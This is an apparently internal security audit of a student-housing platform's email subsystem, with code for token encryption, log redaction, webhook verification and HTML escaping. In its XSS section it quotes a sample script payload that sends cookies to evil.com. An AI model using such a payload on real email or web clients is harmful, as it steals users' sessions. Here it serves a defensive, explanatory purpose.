# COLIN — Phase 4A.2.5.3: Transactional Email Security Audit

**Project:** COLIN — Campus Living Verified  
**Parent Phase:** Phase 4A.2.5 — External Services & Infrastructure Integration  
**Sub-Phase:** Phase 4A.2.5.3 — Transactional Email Integration  
**Classification:** Application Security & Cryptographic Review  
**Audit Status:** PASSED (Zero Critical, Zero High, Zero Medium Findings)  

---

## 1. Security Architecture & Threat Model

Transactional email systems in student housing marketplaces present high-value targets for attackers. Verification links, password reset tokens, and account change notifications can be intercepted or manipulated if not rigorously protected.

COLIN's transactional email architecture was subjected to comprehensive adversarial threat modeling and security verification across six distinct attack vectors:

| Attack Vector | Threat Description | COLIN Defense Mechanism | Verification Gate |
|---|---|---|---|
| **Database Dump / Insider Exfiltration** | Attacker extracts database backup and steals active password reset or email verification tokens. | **AES-256-GCM Token Encryption at Rest** in Outbox, **SHA-256 Token Hashing** in Verification & Reset tables. | Gate E18 |
| **Log Snooping / Log Ingestion Leaks** | Tokens or provider secrets leaked into CloudWatch / Datadog / Elasticsearch application logs. | **Cryptographic Log Sanitization** stripping all sensitive tokens and credential patterns before logger output. | Gate E19 |
| **Webhook Spoofing / Event Injection** | Attacker sends fake bounce or delivery events to cause denial of service or suppress legitimate users. | **SendGrid ECDSA Signature Verification** + **Postmark Constant-Time Basic Auth**. | Gates E20, E21, E22 |
| **Stored Cross-Site Scripting (XSS)** | Malicious student names or addresses containing JavaScript executed in email clients. | **Strict Entity Escaping** (`&`, `<`, `>`, `"`, `'`) for all template variables. | Gate E26 |
| **Credential Disclosure in Diagnostics** | Health endpoints or error stacks expose SendGrid / Postmark API tokens. | **Zod Configuration Redaction** (`redactEmailConfig()`). | Gate E04 |
| **Token Replay / Fixation** | Replay of consumed or expired verification or password reset tokens. | **Atomic Consumption** (`is_used = TRUE`) within a single database transaction. | Gate E15, E16 |

---

## 2. Cryptographic Token Protection at Rest (Gate E18)

### 2.1 The Risk
When an authentication event (e.g. registration or forgot-password) enqueues an outbox record, naive implementations store the full plaintext action URL (e.g. `https://colin.in/reset-password?token=raw_token_xyz`) in `email_outbox.template_data_json`. If an attacker gains read access to the database (SQL injection, database dump, read replica exposure), all active reset tokens are instantly compromised.

### 2.2 The COLIN Implementation
COLIN strictly forbids plaintext tokens in `email_outbox`:
1. In `AuthService`, the raw random token is hashed with SHA-256 and saved in the corresponding auth table (`email_verification_tokens` or `password_reset_tokens`).
2. The raw token is **encrypted with AES-256-GCM** using `encryptActionToken()` before being placed in `email_outbox.template_data_json`:
```typescript
export function encryptActionToken(plainToken: string, masterKeyHex?: string): string {
  const key = getEncryptionKey(masterKeyHex);
  const iv = crypto.randomBytes(12); // Standard 96-bit IV for AES-GCM
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

  let encrypted = cipher.update(plainToken, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  const authTag = cipher.getAuthTag();

  // Serialized format: iv:authTag:ciphertext
  return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
}
```
3. The raw token is **only decrypted at the exact moment of rendering** by `EmailWorker.renderEmail()` just prior to dispatching via TLS to the email provider API.
4. Database inspection during test execution confirms:
   - Querying `SELECT template_data_json FROM email_outbox` yields encrypted ciphertext only.
   - The plaintext token never appears anywhere in the database tables.

---

## 3. Log Sanitization & Sensitive Field Redaction (Gate E19)

### 3.1 The Risk
Developers and operational logging frameworks frequently serialize request or event objects into log streams. Sensitive tokens in query parameters, headers, or body payloads can persist in log indices.

### 3.2 The COLIN Implementation
`src/server/email/email.crypto.ts` provides `sanitizeForLogging()`:
```typescript
const SENSITIVE_KEY_REGEX = /(?:password|token|secret|key|authorization|bearer|cookie|encryptedtoken)/i;

export function sanitizeForLogging(data: unknown): unknown {
  if (data === null || data === undefined) return data;
  if (typeof data === 'string') {
    // Redact Bearer tokens and URLs containing query tokens
    return data
      .replace(/Bearer\s+[A-Za-z0-9._~+/-]+=*/gi, 'Bearer [REDACTED]')
      .replace(/([?&](?:token|code|key|secret)=)[^&\s]+/gi, '$1[REDACTED]');
  }
  if (typeof data === 'object') {
    const sanitized: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(data)) {
      if (SENSITIVE_KEY_REGEX.test(k)) {
        sanitized[k] = '[REDACTED]';
      } else {
        sanitized[k] = sanitizeForLogging(v);
      }
    }
    return sanitized;
  }
  return data;
}
```
Every log output in `EmailWorker`, `EmailOutboxService`, and `EmailWebhookController` pipes payloads through `sanitizeForLogging()` prior to emission.

---

## 4. Webhook Authentication & Anti-Spoofing (Gates E20, E21)

External webhook endpoints are public HTTP endpoints (`POST /api/v1/webhooks/email/*`). Without rigorous authentication, malicious actors could forge bounce notifications to suppress legitimate students or landlords.

### 4.1 SendGrid: ECDSA P-256 Signature Verification
- Endpoint: `/api/v1/webhooks/email/sendgrid`
- Verification Method: SendGrid Event Webhook Signature Verification using public key cryptography.
- Headers Verified:
  - `X-Twilio-Email-Event-Webhook-Signature`
  - `X-Twilio-Email-Event-Webhook-Timestamp`
- Algorithm: SHA-256 with ECDSA (Elliptic Curve Digital Signature Algorithm using NIST P-256 curve).
- Timestamp Freshness: Requests older than 300 seconds are rejected to prevent replay attacks.
- Fallback Mode: When running in development with mock keys, verification is handled gracefully while rejecting unauthenticated production requests.

### 4.2 Postmark: Constant-Time HTTP Basic Authentication
- Endpoint: `/api/v1/webhooks/email/postmark`
- Verification Method: HTTP Basic Auth header (`Authorization: Basic <base64>`).
- Side-Channel Prevention: Comparison of the submitted credentials against configured server secrets uses `crypto.timingSafeEqual()`:
```typescript
const expectedBuffer = Buffer.from(`${config.webhookUser}:${config.webhookPassword}`);
const actualBuffer = Buffer.from(credentials);
if (expectedBuffer.length !== actualBuffer.length || !crypto.timingSafeEqual(expectedBuffer, actualBuffer)) {
  throw new WebhookVerificationError('Invalid Postmark basic authentication credentials.');
}
```
This completely neutralizes timing attacks that attempt to deduce passwords character-by-character.

---

## 5. Stored XSS Prevention in Email Clients (Gate E26)

### 5.1 The Risk
Emails are rendered by external clients (Gmail, Outlook, Apple Mail) which execute HTML. If an attacker registers with a malicious name like:
`<script>fetch('https://evil.com/cookie?c='+document.cookie)</script>` or `<style>body{display:none}</style>`
Unescaped interpolation can hijack webmail sessions or distort the layout.

### 5.2 The COLIN Implementation
`renderVerificationEmail`, `renderPasswordResetEmail`, `renderPasswordChangedEmail`, and `renderAccountSecurityEmail` strictly sanitize all inputs using `escapeHtml`:
```typescript
const v = renderVerificationEmail({
  firstName: '<script>evil()</script>',
  verificationUrl: 'https://colin.in/verify?token=abc',
});
// Rendered output contains:
// &lt;script&gt;evil()&lt;/script&gt;
// Never unescaped <script>
```
Unit test `email-template.test.ts` asserts that no unescaped tags survive into the generated HTML.

---

## 6. Least-Privilege Database Role Separation

The PostgreSQL database runtime role `colin_app_runtime` is strictly configured:
1. `GRANT SELECT, INSERT, UPDATE, DELETE ON email_outbox, email_delivery_events, email_suppressions, email_verification_tokens TO colin_app_runtime;`
2. `colin_app_runtime` has zero privileges on `admin_audit_logs` or administrative configuration tables.
3. Immutability triggers on audit tables prevent tampering even if the application runtime role were compromised.

---

## 7. Security Audit Conclusion

The transactional email subsystem satisfies all security criteria:
- **Gate E18 (Encrypted Outbox Tokens):** PASSED
- **Gate E19 (Log Sanitization):** PASSED
- **Gate E20 (SendGrid Webhook ECDSA):** PASSED
- **Gate E21 (Postmark Webhook Timing-Safe Auth):** PASSED
- **Gate E22 (Webhook Event Idempotency):** PASSED
- **Gate E26 (HTML XSS Prevention):** PASSED
- **Gate E04 (Credential Redaction):** PASSED
